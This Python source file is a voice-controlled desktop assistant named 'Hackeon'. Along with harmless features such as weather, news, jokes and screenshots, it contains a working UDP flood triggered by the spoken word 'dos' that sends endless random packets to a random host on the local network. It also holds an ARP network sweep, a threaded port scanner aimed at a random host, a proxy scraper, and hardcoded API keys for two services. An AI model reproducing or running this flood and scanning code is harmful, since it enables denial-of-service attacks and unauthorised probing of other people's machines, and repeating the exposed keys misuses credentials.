import speech_recognition as sr 
from selenium import webdriver  
from bs4 import BeautifulSoup
from pprint import pprint
import scapy.all as scapy
from queue import Queue
from gtts import gTTS 
import datetime
import wikipedia
import requests
import webbrowser
import pyautogui
import pyjokes
import json
import random
import speedtest
import time
import socket
import threading
import subprocess
import playsound 
import os 
from tkinter import *
from urllib.request import urlopen
def run():
    def talk():
        input = sr.Recognizer()
        with sr.Microphone() as source:
            audio = input.listen(source)
            data = ""
            try:
                data = input.recognize_google(audio)
                print("Your question is, " + data)

            except sr.UnknownValueError:
                print("Sorry I did not hear your question, Please repeat again.")
            return data
    def talk2():
        input = sr.Recognizer()
        with sr.Microphone() as source:
            audio = input.listen(source)
            data = ""
            try:
                data = input.recognize_google(audio)
                print("Your Name is, " + data)

            except sr.UnknownValueError:
                print("Sorry I did not hear your Name, Please repeat again.")
            return data

    def respond(output):
        num = 0
        print(output)
        num += 1
        response = gTTS(text=output, lang='en')
        file = str(num)+".mp3"
        response.save(file)
        playsound.playsound(file, True)
        os.remove(file)

    if __name__ == '__main__':
        respond("Hi, I am Hackeon your personal desktop assistant")
        respond("What should i call you?")
        uname = talk2()

        while(1):
            respond(f"How can I help you {uname}?")
            text = talk().lower()

            if text == 0:
                continue

            if "stop" in str(text) or "exit" in str(text) or "bye" in str(text):
                respond(f"Ok bye and take care {uname}")
                window.destroy()
                break

            if 'wikipedia' in text:
                respond('Searching Wikipedia')
                text = text.replace("wikipedia", "")
                results = wikipedia.summary(text, sentences=3)
                respond("According to Wikipedia")
                print(results)
                respond(results)

            elif 'time' in text:
                strTime = datetime.datetime.now().strftime("%H:%M:%S")
                respond(f"the time is {strTime}")

            elif 'search' in text:
                text = text.replace("search", "")
                webbrowser.open_new_tab(text)
                time.sleep(5)

            elif 'open google' in text:
                webbrowser.open_new_tab("https://www.google.com")
                respond("Google is open")
                time.sleep(5)

            elif 'youtube.com' in text:
                respond("Opening in youtube")
                indx = text.split().index('youtube.com')
                query = text.split()[indx + 1:]
                webbrowser.open_new_tab(
                    "https://www.youtube.com/results?search_query=" + '+'.join(query))
            
            elif 'open stackoverflow' in text:
                respond("Here you go to Stack Over flow.Happy coding")
                webbrowser.open("stackoverflow.com")  
    
            elif "open word" in text:
                respond("Opening Microsoft Word")
                subprocess.run(["open", "/Applications/Microsoft Word.app"])

            elif "open powerpoint" in text:
                respond("Opening Microsoft PowerPoint")
                subprocess.run(["open", "/Applications/Microsoft PowerPoint.app"])
    
            elif "open excel" in text:
                respond("Opening Microsoft Excel")
                subprocess.run(["open", "/Applications/Microsoft Excel.app"])

            elif "scan my network" in text:
                request = scapy.ARP()
                request.pdst = '192.168.0.0/24'
                broadcast = scapy.Ether()
                broadcast.dst = 'ff:ff:ff:ff:ff:ff'
                request_broadcast = broadcast / request
                clients = scapy.srp(request_broadcast, timeout=1)[0]
                lst = []
                lst2 = []
                for element in clients:
                    lst.append(element[1].psrc + "      " + element[1].hwsrc)
                    lst2.append(element[1].psrc)
                respond("The IP addresses of Hosts in your network are")
                for i in lst:
                    respond(i)
        
            elif "dos" in text:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1490)
                os.system("clear")
                ipaddress = lst2[random.randint(1, len(lst2)-1)]
                port_no = 80
                os.system("clear")
                sent_packet = 0
                while True:
                    sock.sendto(bytes, (ipaddress, port_no))
                    sent_packet = sent_packet + 1
                    port_no = port_no + 1
                    print("Sent %s packets to %s throught port:%s" %
                        (sent_packet, ipaddress, port_no))
                    if port_no == 65534:
                        port_no = 1
            
            elif "scrape" in text:
                indx = text.split().index("scrape")
                query = text.split()[indx + 1:]
                url = "https://" + ''.join(query)
                reqs = requests.get(url)
                soup = BeautifulSoup(reqs.text, 'html.parser')
                urls = []
                lst2 = []
                for link in soup.find_all('a'):
                    j = link.get('href')
                    lst2.append(j)
                print(lst2)
                k = " ".join(str(x) for x in lst2)
                textfile = open("scraped_urls.txt", "w")
                textfile.write(k)
                textfile.close()
                respond(
                    "Scraped URLs for the site you requested are stored in scraped_urls dot txt file")

            elif "weather" in text:
                    # base URL
                    BASE_URL = "https://api.openweathermap.org/data/2.5/weather?"
                    CITY = "Mumbai"
                    API_KEY = "b35975e18dc93725acb092f7272cc6b8&units=metric"
                    # upadting the URL
                    URL = BASE_URL + "q=" + CITY + "&appid=" + API_KEY
                    # HTTP request
                    response = requests.get(URL)
                    # checking the status code of the request
                    if response.status_code == 200:
                    # getting data in the json format
                        data = response.json()
                        # getting the main dict block
                        main = data['main']
                        # getting temperature
                        temperature = main['temp']
                        # getting the humidity
                        humidity = main['humidity']
                        # getting the pressure
                        pressure = main['pressure']
                        # weather report
                        report = data['weather']
                        respond(f"{CITY:-^30}")
                        respond(f"Temperature: {temperature}°C")
                        respond(f"Humidity: {humidity}%")
                        respond(f"Pressure: {pressure}hPa")
                        respond(f"Weather Report: {report[0]['description']}")
                    else:
                    # showing the error message
                        print("Error in the HTTP request")

            elif "screenshot" in text:
                q=random.randint(0,9999999)
                myScreenshot = pyautogui.screenshot()
                myScreenshot.save(f'{q} file.png')
                respond("Screenshot Taken")
            
            elif "who are you" in text:
                respond("I am Hackeon your virtual assistant created by Rishabh Chopda")

            elif 'joke' in text:
                respond(pyjokes.get_joke())

            elif 'news' in text:  
                url = 'https://newsapi.org/v2/everything?'
                parameters = {
                    'q': 'technology', # query phrase
                    'pageSize': 5,  # maximum is 100
                    'apiKey': 'c5ca7cb2dabc4f2695c217fe4c1d6594' # your own API key
                }  
                response = requests.get(url, params=parameters)
                response_json = response.json()
                for i in response_json['articles']:
                     respond(i['title'])

            elif 'speed test' in text:    
                test = speedtest.Speedtest()
                down = test.download()/1000000
                upload = test.upload ()/1000000
                dload=f"Download Speed: {down} Mbps"
                uload=f"Upload Speed: {upload} Mbps"  
                respond(dload) 
                respond(uload)

            elif 'host information' in text:
                hostname = socket.gethostname()
                respond(f"Hostname: {hostname}")
                m=[l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
                respond(f"Your IP Address: {m}")

            elif 'port scan' in text:
                socket.setdefaulttimeout(0.25)
                print_lock = threading.Lock()
                target = lst2[random.randint(1, len(lst2)-1)]
                t_IP = socket.gethostbyname(target)
                respond (f'Starting scan on host:  {t_IP}')

                def portscan(port):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        con = s.connect((t_IP, port))
                        with print_lock:
                            respond(f'Port {port} is open')
                        con.close()
                    except:
                        pass

                def threader():
                    while True:
                        worker = q.get()
                        portscan(worker)
                        q.task_done()
                        
                q = Queue()
                startTime = time.time()
                
                for x in range(100):
                    t = threading.Thread(target = threader)
                    t.daemon = True
                    t.start()
                
                for worker in range(1, 5000):
                    q.put(worker)
                
                q.join()
                print('Time taken:', time.time() - startTime)

            elif 'get proxy' in text:
                 def get_free_proxies():
                    url = "https://free-proxy-list.net/"
                    soup = BeautifulSoup(requests.get(url).content, "html.parser")
                    proxies = []
                    for row in soup.find("table", attrs={"id": "proxylisttable"}).find_all("tr")[1:]:
                        tds = row.find_all("td")
                        try:
                            ip = tds[0].text.strip()
                            port = tds[1].text.strip()
                            host = f"{ip}:{port}"
                            proxies.append(host)
                        except IndexError:
                            continue
                    return proxies
                 j=get_free_proxies()
                 print(j)
                 with open('proxies.txt', 'w') as proxyfile:
                        for listitem in j:
                            proxyfile.write('%s\n' % listitem)
                 print("\n")
                 respond("Proxies are stored in proxies.txt file in your current working directory")   
            else:
                respond("Application not available")
            

window = Tk()
window.geometry("240x200")
window.resizable(False, False)
window.title("Hackeon Voice Assistant")
window['background']='#1B3459'
imgr = PhotoImage(file="run.png")
b = Button(window, text="Start", command=run,image=imgr,fg='#03045e',relief=RAISED)
b.place(x=70, y=60)
def callback(url):
    webbrowser.open_new_tab(url)
link = Label(window, text="Made By: @rishabhchopda ",font=('Verdana 15 underline', 15,'underline'), bg="#1B3459",fg="#40C6CC", cursor="hand",)
link.place(x=25,y=160)
link.bind("<Button-1>", lambda e:
callback("https://rishabhc9.github.io/rishabhchopda/"))
window.mainloop()
